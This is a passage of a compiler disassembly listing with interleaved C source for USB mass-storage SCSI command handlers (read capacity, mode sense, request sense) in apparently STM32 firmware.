 8009f9a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f9e:	68fa      	ldr	r2, [r7, #12]
 8009fa0:	33b0      	adds	r3, #176	; 0xb0
 8009fa2:	009b      	lsls	r3, r3, #2
 8009fa4:	4413      	add	r3, r2
 8009fa6:	685b      	ldr	r3, [r3, #4]
 8009fa8:	685c      	ldr	r4, [r3, #4]
 8009faa:	69bb      	ldr	r3, [r7, #24]
 8009fac:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009fb0:	3308      	adds	r3, #8
 8009fb2:	69ba      	ldr	r2, [r7, #24]
 8009fb4:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009fb8:	3204      	adds	r2, #4
 8009fba:	7af8      	ldrb	r0, [r7, #11]
 8009fbc:	4619      	mov	r1, r3
 8009fbe:	47a0      	blx	r4
 8009fc0:	4603      	mov	r3, r0
 8009fc2:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009fc4:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009fc8:	2b00      	cmp	r3, #0
 8009fca:	d106      	bne.n	8009fda <SCSI_ReadCapacity16+0x6c>
 8009fcc:	69bb      	ldr	r3, [r7, #24]
 8009fce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fd2:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009fd6:	2b02      	cmp	r3, #2
 8009fd8:	d108      	bne.n	8009fec <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009fda:	7af9      	ldrb	r1, [r7, #11]
 8009fdc:	233a      	movs	r3, #58	; 0x3a
 8009fde:	2202      	movs	r2, #2
 8009fe0:	68f8      	ldr	r0, [r7, #12]
 8009fe2:	f000 fa01 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 8009fe6:	f04f 33ff 	mov.w	r3, #4294967295
 8009fea:	e081      	b.n	800a0f0 <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009fec:	687b      	ldr	r3, [r7, #4]
 8009fee:	330a      	adds	r3, #10
 8009ff0:	781b      	ldrb	r3, [r3, #0]
 8009ff2:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009ff4:	687b      	ldr	r3, [r7, #4]
 8009ff6:	330b      	adds	r3, #11
 8009ff8:	781b      	ldrb	r3, [r3, #0]
 8009ffa:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009ffc:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009ffe:	687b      	ldr	r3, [r7, #4]
 800a000:	330c      	adds	r3, #12
 800a002:	781b      	ldrb	r3, [r3, #0]
 800a004:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a006:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a008:	687a      	ldr	r2, [r7, #4]
 800a00a:	320d      	adds	r2, #13
 800a00c:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a00e:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a010:	69bb      	ldr	r3, [r7, #24]
 800a012:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a014:	2300      	movs	r3, #0
 800a016:	61fb      	str	r3, [r7, #28]
 800a018:	e008      	b.n	800a02c <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 800a01a:	69ba      	ldr	r2, [r7, #24]
 800a01c:	69fb      	ldr	r3, [r7, #28]
 800a01e:	4413      	add	r3, r2
 800a020:	3310      	adds	r3, #16
 800a022:	2200      	movs	r2, #0
 800a024:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a026:	69fb      	ldr	r3, [r7, #28]
 800a028:	3301      	adds	r3, #1
 800a02a:	61fb      	str	r3, [r7, #28]
 800a02c:	69bb      	ldr	r3, [r7, #24]
 800a02e:	68db      	ldr	r3, [r3, #12]
 800a030:	69fa      	ldr	r2, [r7, #28]
 800a032:	429a      	cmp	r2, r3
 800a034:	d3f1      	bcc.n	800a01a <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 800a036:	69bb      	ldr	r3, [r7, #24]
 800a038:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a03c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a03e:	3b01      	subs	r3, #1
 800a040:	0e1b      	lsrs	r3, r3, #24
 800a042:	b2da      	uxtb	r2, r3
 800a044:	69bb      	ldr	r3, [r7, #24]
 800a046:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 800a048:	69bb      	ldr	r3, [r7, #24]
 800a04a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a04e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a050:	3b01      	subs	r3, #1
 800a052:	0c1b      	lsrs	r3, r3, #16
 800a054:	b2da      	uxtb	r2, r3
 800a056:	69bb      	ldr	r3, [r7, #24]
 800a058:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 800a05a:	69bb      	ldr	r3, [r7, #24]
 800a05c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a060:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a062:	3b01      	subs	r3, #1
 800a064:	0a1b      	lsrs	r3, r3, #8
 800a066:	b2da      	uxtb	r2, r3
 800a068:	69bb      	ldr	r3, [r7, #24]
 800a06a:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 800a06c:	69bb      	ldr	r3, [r7, #24]
 800a06e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a072:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a074:	b2db      	uxtb	r3, r3
 800a076:	3b01      	subs	r3, #1
 800a078:	b2da      	uxtb	r2, r3
 800a07a:	69bb      	ldr	r3, [r7, #24]
 800a07c:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 800a07e:	69bb      	ldr	r3, [r7, #24]
 800a080:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a084:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a088:	161b      	asrs	r3, r3, #24
 800a08a:	b2da      	uxtb	r2, r3
 800a08c:	69bb      	ldr	r3, [r7, #24]
 800a08e:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 800a090:	69bb      	ldr	r3, [r7, #24]
 800a092:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a096:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a09a:	141b      	asrs	r3, r3, #16
 800a09c:	b2da      	uxtb	r2, r3
 800a09e:	69bb      	ldr	r3, [r7, #24]
 800a0a0:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 800a0a2:	69bb      	ldr	r3, [r7, #24]
 800a0a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0a8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a0ac:	0a1b      	lsrs	r3, r3, #8
 800a0ae:	b29b      	uxth	r3, r3
 800a0b0:	b2da      	uxtb	r2, r3
 800a0b2:	69bb      	ldr	r3, [r7, #24]
 800a0b4:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 800a0b6:	69bb      	ldr	r3, [r7, #24]
 800a0b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0bc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a0c0:	b2da      	uxtb	r2, r3
 800a0c2:	69bb      	ldr	r3, [r7, #24]
 800a0c4:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0c6:	687b      	ldr	r3, [r7, #4]
 800a0c8:	330a      	adds	r3, #10
 800a0ca:	781b      	ldrb	r3, [r3, #0]
 800a0cc:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a0ce:	687b      	ldr	r3, [r7, #4]
 800a0d0:	330b      	adds	r3, #11
 800a0d2:	781b      	ldrb	r3, [r3, #0]
 800a0d4:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0d6:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a0d8:	687b      	ldr	r3, [r7, #4]
 800a0da:	330c      	adds	r3, #12
 800a0dc:	781b      	ldrb	r3, [r3, #0]
 800a0de:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a0e0:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a0e2:	687a      	ldr	r2, [r7, #4]
 800a0e4:	320d      	adds	r2, #13
 800a0e6:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a0e8:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0ea:	69bb      	ldr	r3, [r7, #24]
 800a0ec:	60da      	str	r2, [r3, #12]

  return 0;
 800a0ee:	2300      	movs	r3, #0
}
 800a0f0:	4618      	mov	r0, r3
 800a0f2:	3724      	adds	r7, #36	; 0x24
 800a0f4:	46bd      	mov	sp, r7
 800a0f6:	bd90      	pop	{r4, r7, pc}

0800a0f8 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0f8:	b580      	push	{r7, lr}
 800a0fa:	b088      	sub	sp, #32
 800a0fc:	af00      	add	r7, sp, #0
 800a0fe:	60f8      	str	r0, [r7, #12]
 800a100:	460b      	mov	r3, r1
 800a102:	607a      	str	r2, [r7, #4]
 800a104:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a106:	68fb      	ldr	r3, [r7, #12]
 800a108:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a10c:	68fb      	ldr	r3, [r7, #12]
 800a10e:	32b0      	adds	r2, #176	; 0xb0
 800a110:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a114:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 800a116:	69bb      	ldr	r3, [r7, #24]
 800a118:	2b00      	cmp	r3, #0
 800a11a:	d102      	bne.n	800a122 <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 800a11c:	f04f 33ff 	mov.w	r3, #4294967295
 800a120:	e063      	b.n	800a1ea <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 800a122:	68fb      	ldr	r3, [r7, #12]
 800a124:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a128:	68fa      	ldr	r2, [r7, #12]
 800a12a:	33b0      	adds	r3, #176	; 0xb0
 800a12c:	009b      	lsls	r3, r3, #2
 800a12e:	4413      	add	r3, r2
 800a130:	685b      	ldr	r3, [r3, #4]
 800a132:	685b      	ldr	r3, [r3, #4]
 800a134:	f107 0214 	add.w	r2, r7, #20
 800a138:	f107 0110 	add.w	r1, r7, #16
 800a13c:	7af8      	ldrb	r0, [r7, #11]
 800a13e:	4798      	blx	r3
 800a140:	4603      	mov	r3, r0
 800a142:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 800a144:	f997 3017 	ldrsb.w	r3, [r7, #23]
 800a148:	2b00      	cmp	r3, #0
 800a14a:	d106      	bne.n	800a15a <SCSI_ReadFormatCapacity+0x62>
 800a14c:	69bb      	ldr	r3, [r7, #24]
 800a14e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a152:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a156:	2b02      	cmp	r3, #2
 800a158:	d108      	bne.n	800a16c <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a15a:	7af9      	ldrb	r1, [r7, #11]
 800a15c:	233a      	movs	r3, #58	; 0x3a
 800a15e:	2202      	movs	r2, #2
 800a160:	68f8      	ldr	r0, [r7, #12]
 800a162:	f000 f941 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 800a166:	f04f 33ff 	mov.w	r3, #4294967295
 800a16a:	e03e      	b.n	800a1ea <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 800a16c:	2300      	movs	r3, #0
 800a16e:	83fb      	strh	r3, [r7, #30]
 800a170:	e007      	b.n	800a182 <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 800a172:	8bfb      	ldrh	r3, [r7, #30]
 800a174:	69ba      	ldr	r2, [r7, #24]
 800a176:	4413      	add	r3, r2
 800a178:	2200      	movs	r2, #0
 800a17a:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 800a17c:	8bfb      	ldrh	r3, [r7, #30]
 800a17e:	3301      	adds	r3, #1
 800a180:	83fb      	strh	r3, [r7, #30]
 800a182:	8bfb      	ldrh	r3, [r7, #30]
 800a184:	2b0b      	cmp	r3, #11
 800a186:	d9f4      	bls.n	800a172 <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 800a188:	69bb      	ldr	r3, [r7, #24]
 800a18a:	2208      	movs	r2, #8
 800a18c:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 800a18e:	693b      	ldr	r3, [r7, #16]
 800a190:	3b01      	subs	r3, #1
 800a192:	0e1b      	lsrs	r3, r3, #24
 800a194:	b2da      	uxtb	r2, r3
 800a196:	69bb      	ldr	r3, [r7, #24]
 800a198:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 800a19a:	693b      	ldr	r3, [r7, #16]
 800a19c:	3b01      	subs	r3, #1
 800a19e:	0c1b      	lsrs	r3, r3, #16
 800a1a0:	b2da      	uxtb	r2, r3
 800a1a2:	69bb      	ldr	r3, [r7, #24]
 800a1a4:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 800a1a6:	693b      	ldr	r3, [r7, #16]
 800a1a8:	3b01      	subs	r3, #1
 800a1aa:	0a1b      	lsrs	r3, r3, #8
 800a1ac:	b2da      	uxtb	r2, r3
 800a1ae:	69bb      	ldr	r3, [r7, #24]
 800a1b0:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 800a1b2:	693b      	ldr	r3, [r7, #16]
 800a1b4:	b2db      	uxtb	r3, r3
 800a1b6:	3b01      	subs	r3, #1
 800a1b8:	b2da      	uxtb	r2, r3
 800a1ba:	69bb      	ldr	r3, [r7, #24]
 800a1bc:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 800a1be:	69bb      	ldr	r3, [r7, #24]
 800a1c0:	2202      	movs	r2, #2
 800a1c2:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a1c4:	8abb      	ldrh	r3, [r7, #20]
 800a1c6:	141b      	asrs	r3, r3, #16
 800a1c8:	b2da      	uxtb	r2, r3
 800a1ca:	69bb      	ldr	r3, [r7, #24]
 800a1cc:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a1ce:	8abb      	ldrh	r3, [r7, #20]
 800a1d0:	0a1b      	lsrs	r3, r3, #8
 800a1d2:	b29b      	uxth	r3, r3
 800a1d4:	b2da      	uxtb	r2, r3
 800a1d6:	69bb      	ldr	r3, [r7, #24]
 800a1d8:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a1da:	8abb      	ldrh	r3, [r7, #20]
 800a1dc:	b2da      	uxtb	r2, r3
 800a1de:	69bb      	ldr	r3, [r7, #24]
 800a1e0:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a1e2:	69bb      	ldr	r3, [r7, #24]
 800a1e4:	220c      	movs	r2, #12
 800a1e6:	60da      	str	r2, [r3, #12]

  return 0;
 800a1e8:	2300      	movs	r3, #0
}
 800a1ea:	4618      	mov	r0, r3
 800a1ec:	3720      	adds	r7, #32
 800a1ee:	46bd      	mov	sp, r7
 800a1f0:	bd80      	pop	{r7, pc}
	...

0800a1f4 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a1f4:	b580      	push	{r7, lr}
 800a1f6:	b086      	sub	sp, #24
 800a1f8:	af00      	add	r7, sp, #0
 800a1fa:	60f8      	str	r0, [r7, #12]
 800a1fc:	460b      	mov	r3, r1
 800a1fe:	607a      	str	r2, [r7, #4]
 800a200:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a202:	68fb      	ldr	r3, [r7, #12]
 800a204:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a208:	68fb      	ldr	r3, [r7, #12]
 800a20a:	32b0      	adds	r2, #176	; 0xb0
 800a20c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a210:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a212:	2317      	movs	r3, #23
 800a214:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a216:	693b      	ldr	r3, [r7, #16]
 800a218:	2b00      	cmp	r3, #0
 800a21a:	d102      	bne.n	800a222 <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a21c:	f04f 33ff 	mov.w	r3, #4294967295
 800a220:	e011      	b.n	800a246 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a222:	687b      	ldr	r3, [r7, #4]
 800a224:	3304      	adds	r3, #4
 800a226:	781b      	ldrb	r3, [r3, #0]
 800a228:	b29b      	uxth	r3, r3
 800a22a:	8afa      	ldrh	r2, [r7, #22]
 800a22c:	429a      	cmp	r2, r3
 800a22e:	d303      	bcc.n	800a238 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a230:	687b      	ldr	r3, [r7, #4]
 800a232:	3304      	adds	r3, #4
 800a234:	781b      	ldrb	r3, [r3, #0]
 800a236:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a238:	8afb      	ldrh	r3, [r7, #22]
 800a23a:	461a      	mov	r2, r3
 800a23c:	4904      	ldr	r1, [pc, #16]	; (800a250 <SCSI_ModeSense6+0x5c>)
 800a23e:	6938      	ldr	r0, [r7, #16]
 800a240:	f000 feb8 	bl	800afb4 <SCSI_UpdateBotData>

  return 0;
 800a244:	2300      	movs	r3, #0
}
 800a246:	4618      	mov	r0, r3
 800a248:	3718      	adds	r7, #24
 800a24a:	46bd      	mov	sp, r7
 800a24c:	bd80      	pop	{r7, pc}
 800a24e:	bf00      	nop
 800a250:	2000011c 	.word	0x2000011c

0800a254 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a254:	b580      	push	{r7, lr}
 800a256:	b086      	sub	sp, #24
 800a258:	af00      	add	r7, sp, #0
 800a25a:	60f8      	str	r0, [r7, #12]
 800a25c:	460b      	mov	r3, r1
 800a25e:	607a      	str	r2, [r7, #4]
 800a260:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a262:	68fb      	ldr	r3, [r7, #12]
 800a264:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a268:	68fb      	ldr	r3, [r7, #12]
 800a26a:	32b0      	adds	r2, #176	; 0xb0
 800a26c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a270:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a272:	231b      	movs	r3, #27
 800a274:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a276:	693b      	ldr	r3, [r7, #16]
 800a278:	2b00      	cmp	r3, #0
 800a27a:	d102      	bne.n	800a282 <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a27c:	f04f 33ff 	mov.w	r3, #4294967295
 800a280:	e011      	b.n	800a2a6 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a282:	687b      	ldr	r3, [r7, #4]
 800a284:	3308      	adds	r3, #8
 800a286:	781b      	ldrb	r3, [r3, #0]
 800a288:	b29b      	uxth	r3, r3
 800a28a:	8afa      	ldrh	r2, [r7, #22]
 800a28c:	429a      	cmp	r2, r3
 800a28e:	d303      	bcc.n	800a298 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a290:	687b      	ldr	r3, [r7, #4]
 800a292:	3308      	adds	r3, #8
 800a294:	781b      	ldrb	r3, [r3, #0]
 800a296:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a298:	8afb      	ldrh	r3, [r7, #22]
 800a29a:	461a      	mov	r2, r3
 800a29c:	4904      	ldr	r1, [pc, #16]	; (800a2b0 <SCSI_ModeSense10+0x5c>)
 800a29e:	6938      	ldr	r0, [r7, #16]
 800a2a0:	f000 fe88 	bl	800afb4 <SCSI_UpdateBotData>

  return 0;
 800a2a4:	2300      	movs	r3, #0
}
 800a2a6:	4618      	mov	r0, r3
 800a2a8:	3718      	adds	r7, #24
 800a2aa:	46bd      	mov	sp, r7
 800a2ac:	bd80      	pop	{r7, pc}
 800a2ae:	bf00      	nop
 800a2b0:	20000134 	.word	0x20000134

0800a2b4 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2b4:	b580      	push	{r7, lr}
 800a2b6:	b086      	sub	sp, #24
 800a2b8:	af00      	add	r7, sp, #0
 800a2ba:	60f8      	str	r0, [r7, #12]
 800a2bc:	460b      	mov	r3, r1
 800a2be:	607a      	str	r2, [r7, #4]
 800a2c0:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2c2:	68fb      	ldr	r3, [r7, #12]
 800a2c4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2c8:	68fb      	ldr	r3, [r7, #12]
 800a2ca:	32b0      	adds	r2, #176	; 0xb0
 800a2cc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2d0:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a2d2:	693b      	ldr	r3, [r7, #16]
 800a2d4:	2b00      	cmp	r3, #0
 800a2d6:	d102      	bne.n	800a2de <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a2d8:	f04f 33ff 	mov.w	r3, #4294967295
 800a2dc:	e080      	b.n	800a3e0 <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a2de:	693b      	ldr	r3, [r7, #16]
 800a2e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2e4:	699b      	ldr	r3, [r3, #24]
 800a2e6:	2b00      	cmp	r3, #0
 800a2e8:	d10b      	bne.n	800a302 <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a2ea:	693b      	ldr	r3, [r7, #16]
 800a2ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2f0:	7f59      	ldrb	r1, [r3, #29]
 800a2f2:	2320      	movs	r3, #32
 800a2f4:	2205      	movs	r2, #5
 800a2f6:	68f8      	ldr	r0, [r7, #12]
 800a2f8:	f000 f876 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 800a2fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a300:	e06e      	b.n	800a3e0 <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a302:	2300      	movs	r3, #0
 800a304:	75fb      	strb	r3, [r7, #23]
 800a306:	e007      	b.n	800a318 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a308:	7dfb      	ldrb	r3, [r7, #23]
 800a30a:	693a      	ldr	r2, [r7, #16]
 800a30c:	4413      	add	r3, r2
 800a30e:	2200      	movs	r2, #0
 800a310:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a312:	7dfb      	ldrb	r3, [r7, #23]
 800a314:	3301      	adds	r3, #1
 800a316:	75fb      	strb	r3, [r7, #23]
 800a318:	7dfb      	ldrb	r3, [r7, #23]
 800a31a:	2b11      	cmp	r3, #17
 800a31c:	d9f4      	bls.n	800a308 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a31e:	693b      	ldr	r3, [r7, #16]
 800a320:	2270      	movs	r2, #112	; 0x70
 800a322:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a324:	693b      	ldr	r3, [r7, #16]
 800a326:	220c      	movs	r2, #12
 800a328:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a32a:	693b      	ldr	r3, [r7, #16]
 800a32c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a330:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a334:	693b      	ldr	r3, [r7, #16]
 800a336:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a33a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a33e:	429a      	cmp	r2, r3
 800a340:	d03f      	beq.n	800a3c2 <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a342:	693b      	ldr	r3, [r7, #16]
 800a344:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a348:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a34c:	461a      	mov	r2, r3
 800a34e:	693b      	ldr	r3, [r7, #16]
 800a350:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a354:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a358:	693b      	ldr	r3, [r7, #16]
 800a35a:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a35c:	693b      	ldr	r3, [r7, #16]
 800a35e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a362:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a366:	693a      	ldr	r2, [r7, #16]
 800a368:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a36c:	00db      	lsls	r3, r3, #3
 800a36e:	4413      	add	r3, r2
 800a370:	791a      	ldrb	r2, [r3, #4]
 800a372:	693b      	ldr	r3, [r7, #16]
 800a374:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a376:	693b      	ldr	r3, [r7, #16]
 800a378:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a37c:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a380:	693a      	ldr	r2, [r7, #16]
 800a382:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a386:	00db      	lsls	r3, r3, #3
 800a388:	4413      	add	r3, r2
 800a38a:	795a      	ldrb	r2, [r3, #5]
 800a38c:	693b      	ldr	r3, [r7, #16]
 800a38e:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
